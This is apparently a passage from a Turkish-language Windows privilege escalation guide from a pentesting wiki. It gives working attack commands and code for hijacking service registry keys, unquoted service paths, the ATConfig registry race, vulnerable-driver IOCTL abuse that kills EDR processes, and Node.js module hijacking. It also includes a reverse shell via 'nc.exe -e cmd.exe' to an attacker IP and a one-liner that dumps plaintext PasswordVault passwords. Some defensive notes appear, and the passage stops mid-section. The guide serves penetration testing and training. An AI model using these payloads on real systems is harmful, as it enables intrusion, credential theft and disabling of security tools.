Herhangi bir hizmet kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet **kayıt defteri** üzerindeki **izinlerinizi** şu şekilde **kontrol edebilirsiniz**:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** gruplarının `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Sahiplerse, service tarafından çalıştırılan binary değiştirilebilir.

Service tarafından çalıştırılan binary'nin Path'ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Bazı Windows Accessibility özellikleri, daha sonra bir **SYSTEM** process tarafından bir HKLM session key içine kopyalanan, kullanıcı başına **ATConfig** key'leri oluşturur. Bir registry **symbolic link race**, bu privileged write işlemini **herhangi bir HKLM path**'ine yönlendirerek rastgele bir HKLM **value write** primitive'i sağlar.<sup>[[18]](#references)</sup>

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü accessibility özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı tarafından kontrol edilen configuration'ı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, logon/secure-desktop transitions sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** value'sunu doldurun.
2. Secure-desktop copy işlemini tetikleyin (örneğin **LockWorkstation**); bu işlem AT broker flow'u başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerine bir **oplock** yerleştirerek **race'i kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** key'ini protected bir HKLM target'ına yönlendiren bir **registry link** ile değiştirin.
4. SYSTEM, attacker tarafından seçilen value'yu yönlendirilmiş HKLM path'ine yazar.

Rastgele HKLM value write elde ettikten sonra service configuration value'larını overwrite ederek LPE'ye geçin:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir service seçin (örneğin **`msiserver`**) ve write işleminden sonra service'i trigger edin. **Note:** public exploit implementation, race'in bir parçası olarak **workstation'ı lock eder**.

Example tooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Bir registry üzerinde bu izne sahipseniz, **bu registry'den alt registry'ler oluşturabilirsiniz** anlamına gelir. Windows servisleri söz konusu olduğunda bu, **istediğiniz kodu çalıştırmak için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable'ın yolu tırnak işaretleri içinde değilse Windows, boşluktan önce biten her yolu çalıştırmayı deneyecektir.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları çalıştırmayı deneyecektir:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listeleyin:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu güvenlik açığını tespit edebilir ve exploit edebilirsiniz** metasploit ile: `exploit/windows/local/trusted\_service\_path` metasploit ile manuel olarak bir service binary oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma Eylemleri

Windows, bir service başarısız olduğunda gerçekleştirilecek eylemleri kullanıcıların belirtmesine olanak tanır. Bu özellik bir binary'yi işaret edecek şekilde yapılandırılabilir. Bu binary değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla ayrıntı [resmi belgelerde](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bulunabilir.

## Uygulamalar

### Yüklü Uygulamalar

**binary'lerin izinlerini** kontrol edin (belki birinin üzerine yazıp privilege escalation gerçekleştirebilirsiniz) ve **klasörlerin** izinlerini ([DLL Hijacking](dll-hijacking/index.html)) kontrol edin.
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı özel dosyaları okumak için bir config file'ı değiştirip değiştiremeyeceğinizi veya bir Administrator hesabı tarafından yürütülecek bir binary'yi (schedtasks) değiştirip değiştiremeyeceğinizi kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şunu yapmaktır:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++, `plugins` alt klasörlerindeki tüm plugin DLL'lerini otomatik olarak yükler. Yazılabilir bir portable/copy kurulum mevcutsa, kötü amaçlı bir plugin bırakmak her başlatmada ( `DllMain` ve plugin callback'leri dahil) `notepad++.exe` içinde otomatik code execution sağlar.

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Başka bir kullanıcı tarafından çalıştırılacak bir registry veya binary'nin üzerine yazıp yazamayacağınızı kontrol edin.**\
**Ayrıcalıkları yükseltmek için ilgi çekici **autoruns konumları** hakkında daha fazla bilgi edinmek üzere **aşağıdaki sayfayı okuyun**:**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Driver'lar

Olası **üçüncü taraf, anormal/zafiyetli** driver'ları arayın.
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Bir driver, rastgele kernel okuma/yazma primitive'i sunuyorsa (kötü tasarlanmış IOCTL handler'larında yaygındır), doğrudan kernel memory'den bir SYSTEM token çalarak privilege escalation gerçekleştirebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniğe buradan bakın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Vulnerable çağrının attacker-controlled bir Object Manager path açtığı race-condition bug'larında, lookup işlemini kasıtlı olarak yavaşlatmak (max-length component'ler veya derin directory chain'leri kullanarak) window'u mikrosaniyelerden onlarca mikrosaniyeye çıkarabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool disclosure'ları ve I/O ring pivot'ları

Bazı Windows kernel LPE chain'leri, ayrı ayrı zayıf olan iki bug'dan oluşturulabilir: queue lock hâlâ tutulurken bir request/CBD'yi serbest bırakan bir **cancel-safe queue lifetime race** ve `RtlCopyToUser` sırasında serbest bırakılmış bir paged-pool allocation'ını leak eden bir **lock-release-before-copy** disclosure.<sup>[[29]](#references)</sup>

Audit ve exploitation notları:

- **Free-under-lock + cancel afterwards**: success path'in **Acquire -> CompleteRequest/free -> Release**, cancel path'in ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı durumları arayın. Success path, CBDQ/CSQ lock'unu bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`'a ulaşıyorsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde bloklanan bir thread daha sonra devam edip serbest bırakılmış bir `PFLT_CALLBACK_DATA`'yı driver'ın remove callback'ine geri geçirebilir.
- Serbest bırakılmış queue object'ini aynı boyutta, attacker-controlled bir paged-pool allocation'ı ile **reclaim edin**. `NPFS` Data Queue Entries kullanışlıdır; çünkü payload ve size kontrol edilebilir ve bunları daha sonra pipe read/peek operations ile probe edebilirsiniz. Serbest bırakılan object list link'lerini içeriyorsa, driver'ın original list head'de sonlanması yerine attacker-defined request structure'larını tekrar tekrar işlemesi için bunları user memory'deki **cyclic list of fake request nodes** ile overwrite edin.
- **Predictable write'ı upgrade edin**: fake request, bookkeeping write'larda kullanılan nested context pointer'ını (timestamps / QPC / refcount-adjacent fields) redirect ediyorsa, **address-controlled but not value-controlled** bir kernel write elde edebilirsiniz. Bu durumda final code/data pointer yerine sprayed pool object'inin **length/size** field'ini hedefleyin, ardından corrupted object'in **out-of-bounds paged-pool read** üretmesini sağlayana kadar spray'i enumerate edin.
- **Raceable disclosure pattern**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan herhangi bir syscall güçlü bir adaydır. Attacker'ın copy edilen buffer'ı büyütebilmesi reliability'yi artırır (örneğin serializer'ın final allocation size'ını artıran çok sayıda list/resource entry ekleyerek); çünkü daha uzun copy, machine'i mutlaka crash ettirmeden replacement window'u genişletir.
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer array'leri mükemmel disclosure target'larıdır; çünkü paged-pool size attacker-controlled'dır (`8 * regBufferCnt`) ve her element bir `_IOP_MC_BUFFER_ENTRY`'ye kernel pointer'dır. Bu array'lerden birini leak edin, çevresindeki `IORING_OBJECT`'i recover edin, ardından **`RegBuffers`** ve **`RegBuffersCount`** değerlerini corrupt ederek sonraki I/O ring operations'ın attacker-forged entry'leri tüketmesini ve arbitrary kernel read/write sağlamasını mümkün kılın. Kullanılabilir tek write size stable bir byte veriyorsa (örneğin `KUSER_SHARED_DATA+0x14` üzerinden), `0x0101010101010101` gibi tekrarlanan byte'lardan oluşan bir user pointer oluşturmak için **overlapping unaligned writes** kullanın, bunu `VirtualAlloc` ile map edin ve forged registered-buffer array'i buraya yerleştirin.<sup>[[30]](#references)</sup>

Useful debugging indicators:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Corrupted I/O ring üzerinden arbitrary kernel read/write elde ettikten sonra, standart post-primitive workflow kullanarak bir SYSTEM token çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerability'leri deterministik layout'lar oluşturmanıza, yazılabilir HKLM/HKU alt öğelerini kötüye kullanmanıza ve custom driver olmadan metadata corruption'ı kernel paged-pool overflow'larına dönüştürmenize olanak tanır. Tüm chain'i burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Bazı driver'lar userland'den bir registry path kabul eder, yalnızca bunun geçerli bir UTF-16 string olduğunu doğrular ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `int readValue` gibi bir stack scalar'ına `RTL_QUERY_REGISTRY_DIRECT` ile yapar. `RTL_QUERY_REGISTRY_TYPECHECK` eksikse `EntryContext`, developer'ın beklediği türe göre değil, **actual** registry type'a göre yorumlanır.

Bu durum iki kullanışlı primitive oluşturur:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: User-controlled absolute `\Registry\...` path, driver'ın saldırganın seçtiği key'leri sorgulamasına, return code/log'lar üzerinden varlık bilgisini leak etmesine ve bazı durumlarda caller'ın doğrudan erişemediği value'ları okumasına olanak tanır.
- **Kernel memory corruption**: `&readValue` gibi bir scalar destination, registry value type'a bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış binary buffer olarak type-confused hale gelir.

Practical exploitation notları:

- **Windows 8+ mitigation**: Sorgu, `RTL_QUERY_REGISTRY_DIRECT` ile ancak `RTL_QUERY_REGISTRY_TYPECHECK` olmadan bir **untrusted hive**'a erişirse kernel caller'lar `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile crash olur. Exploitability'yi korumak için value'ları `HKCU` altında staging etmek yerine **trusted system hive**'lar içindeki **attacker-writable key**'leri arayın.
- **Trusted-hive staging**: `\Registry\Machine` altındaki writable descendant'ları enumerate etmek için NtObjectManager kullanın ve sandboxed context'lerden erişilebilen key'leri bulmak üzere taramayı duplicate edilmiş bir **low-integrity** token ile yeniden çalıştırın:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4 baytlık bir `int` içine yapılan 8 baytlık doğrudan yazma, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer'ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext`'in bir `UNICODE_STRING`'i göstermesini bekler. Kod önce attacker-controlled bir `REG_DWORD` değerini stack üzerindeki bir scalar'a yükler ve ardından aynı buffer'ı bir string okuması için yeniden kullanırsa attacker `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer'ını kısmen etkiler; bu da kısmen kontrol edilen bir kernel write elde edilmesini sağlar.
- **`REG_BINARY`**: büyük binary veriler için direct mode, `EntryContext` adresindeki ilk `LONG` değerini signed buffer size olarak ele alır. Önceki bir `REG_DWORD` okuması, yeniden kullanılan scalar içinde **negative** ve attacker-controlled bir değer bırakırsa sonraki `REG_BINARY` query, attacker baytlarını doğrudan bitişik stack slot'larının üzerine kopyalar; bu genellikle callback-pointer overwrite işlemini tamamen gerçekleştirmek için en temiz yoldur.

Güçlü hunting pattern: **aynı stack variable içine, yeniden initialize edilmeden yapılan heterogeneous registry reads**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'larını ve ilk registry read'in ikinci read'in gerçekleşip gerçekleşmeyeceğini kontrol ettiği code path'lerini grep edin.

#### Device object'lerde eksik FILE_DEVICE_SECURE_OPEN flag'ini abuse etme (LPE + EDR kill)

Bazı signed third-party driver'lar, IoCreateDeviceSecure ile güçlü bir SDDL kullanarak device object oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN flag'ini ayarlamayı unutur. Bu flag olmadan secure DACL, device içinde extra component içeren bir path üzerinden açılış yapıldığında uygulanmaz; böylece herhangi bir unprivileged user aşağıdaki gibi bir namespace path kullanarak handle elde edebilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek bir vakadan)

Bir user device'ı açabildiğinde, driver tarafından sunulan privileged IOCTL'lar LPE ve tampering için abuse edilebilir. Gerçek dünyada gözlemlenen örnek yetenekler:
- Arbitrary process'lere full-access handle döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser üzerinden SYSTEM shell).
- Kısıtlanmamış raw disk read/write (offline tampering, boot-time persistence tricks).
- Protected Process/Light (PP/PPL) dahil arbitrary process'leri terminate etme; böylece user land üzerinden kernel aracılığıyla AV/EDR kill gerçekleştirme.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için Mitigations
- DACL tarafından kısıtlanması amaçlanan device objects oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Privileged operations için caller context doğrulaması yapın. Process termination veya handle returns işlemine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL'leri (access masks, METHOD_*, input validation) kısıtlayın ve doğrudan kernel privileges yerine brokered modelleri değerlendirin.

Defenders için Detection fikirleri
- Şüpheli device names (ör. \\ .\\amsdk*) için user-mode opens işlemlerini ve abuse belirtisi olan belirli IOCTL sequences işlemlerini izleyin.
- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi allow/deny lists listenizi yönetin.


## PATH DLL Hijacking

**PATH üzerinde bulunan bir klasörün içinde write permissions** varsa bir process tarafından yüklenen bir DLL'i hijack edebilir ve **privileges escalate** edebilirsiniz.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin permissions değerlerini kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu kontrolün nasıl abuse edileceği hakkında daha fazla bilgi:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron module resolution hijacking

Bu, **Node.js** ve **Electron** uygulamalarını, beklenen module **eksik** olduğunda `require("foo")` gibi yalın bir import gerçekleştirdiklerinde etkileyen bir **Windows uncontrolled search path** varyantıdır.<sup>[[20]](#references)</sup>

Node, üst dizin ağacında ilerleyerek her üst dizindeki `node_modules` klasörlerini kontrol eder. Windows'ta bu arama sürücü kök dizinine kadar ulaşabilir; bu nedenle `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şu yolları kontrol edebilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**Düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa, kötü amaçlı bir `foo.js` (veya package klasörü) yerleştirip **daha yüksek ayrıcalıklı bir Node/Electron process** eksik dependency'yi resolve edene kadar bekleyebilir. Payload, victim process'in security context'inde çalışır; bu nedenle hedef administrator olarak, elevated scheduled task/service wrapper içinden veya auto-started privileged desktop app olarak çalıştığında bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu koşullarda yaygındır:

- bir dependency `optionalDependencies` içinde tanımlandığında<sup>[[22]](#references)</sup>
- bir third-party library `require("foo")` ifadesini `try/catch` içinde wrap edip hata durumunda devam ettiğinde
- bir package production build'lerinden kaldırıldığında, packaging sırasında dahil edilmediğinde veya yüklenemediğinde
- vulnerable `require()` ana application code'u yerine dependency tree'nin derinliklerinde bulunduğunda

### Vulnerable target'ları arama

Resolution path'i kanıtlamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` = hedef executable (`node.exe`, Electron app EXE'si veya wrapper process'i) olacak şekilde filtreleyin
- `Path` `contains` `node_modules` olacak şekilde filtreleyin
- `NAME NOT FOUND` ve `C:\node_modules` altındaki son başarılı open işlemlerine odaklanın

Unpacked `.asar` dosyalarında veya application source'larında yararlı code-review pattern'leri:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon veya source review üzerinden **missing package name** değerini belirleyin.
2. Mevcut değilse root lookup dizinini oluşturun:
```powershell
mkdir C:\node_modules
```
3. Tam olarak beklenen ada sahip bir modül bırakın:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Mağdur uygulamayı tetikleyin. Uygulama `require("foo")` denediğinde ve meşru modül mevcut olmadığında Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu desene uyan eksik isteğe bağlı modüllerin gerçek dünya örnekleri arasında `bluebird` ve `utf-8-validate` bulunur; ancak yeniden kullanılabilir olan kısım **technique**'tir: ayrıcalıklı bir Windows Node/Electron sürecinin çözümleyeceği herhangi bir **missing bare import** bulun.

### Detection and hardening ideas

- Bir kullanıcının `C:\node_modules` oluşturması veya buraya yeni `.js` dosyaları/paketleri yazması durumunda alert oluşturun.
- Yüksek bütünlük düzeyine sahip süreçlerin `C:\node_modules\*` üzerinden okuma yapmasını araştırın.
- Production ortamındaki tüm runtime dependencies paketleyin ve `optionalDependencies` kullanımını audit edin.
- Üçüncü taraf kodlarında sessiz `try { require("...") } catch {}` kalıplarını inceleyin.
- Library destekliyorsa optional probes özelliğini devre dışı bırakın (örneğin bazı `ws` deployment'ları, `WS_NO_UTF_8_VALIDATE=1` ile legacy `utf-8-validate` probe'unu önleyebilir).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts dosyasında sabit kodlanmış diğer bilinen bilgisayarları kontrol edin
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri ve DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **kısıtlanmış hizmetleri** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Güvenlik Duvarı Kuralları

[**Güvenlik Duvarı ile ilgili komutlar için bu sayfayı kontrol edin**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

[Network enumeration için daha fazla komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
`bash.exe` binary dosyası `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` içinde de bulunabilir.

root user elde ederseniz herhangi bir portu dinleyebilirsiniz (`nc.exe` ile bir portu dinlemek için ilk kez kullandığınızda GUI üzerinden `nc` uygulamasına firewall tarafından izin verilip verilmeyeceği sorulur).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> adresinden\
Windows Vault, **Windows**'un kullanıcıları **otomatik olarak oturum açtırmak** için kullanabileceği sunuculara, web sitelerine ve diğer programlara ait kullanıcı kimlik bilgilerini saklar. İlk bakışta bu, kullanıcıların Facebook, Twitter veya Gmail gibi sitelere ait kimlik bilgilerini saklayabileceği ve tarayıcıların otomatik olarak oturum açabileceği anlamına geliyor gibi görünebilir; ancak çalışma şekli bu değildir.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırabileceği kimlik bilgilerini saklar. Bu, **bir kaynağa erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir Windows uygulamasının** (sunucu veya web sitesi) **bu Credential Manager** ve Windows Vault'tan yararlanabileceği ve kullanıcıların her seferinde kullanıcı adı ile parola girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynağa ait kimlik bilgilerini kullanmalarının mümkün olduğunu düşünmüyorum. Bu nedenle uygulamanız vault'tan yararlanmak istiyorsa, bir şekilde **credential manager ile iletişim kurmalı ve bu kaynak için kimlik bilgilerini** varsayılan depolama vault'undan **istemelidir**.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ardından, kaydedilmiş kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçenekleriyle kullanabilirsiniz. Aşağıdaki örnek, bir SMB share üzerinden uzak bir binary'yi çağırmaktadır.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Sağlanan kimlik bilgileriyle `runas` kullanma.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) üzerinden de.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama token'larını ve plaintext password'lerini Universal Windows Platform (UWP) `PasswordVault` içinde depolar. Bu depolama alanı oturumdan izole edilmiştir ve yönetici veya `SeDebugPrivilege` yetkileri olmadan native olarak decrypt edilebilir.

Depolanan tüm kullanıcı adlarını ve plaintext password'lerini anında dump edip decrypt etmek için bu PowerShell komutunu kullanıcının aktif oturumunda çalıştırın:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

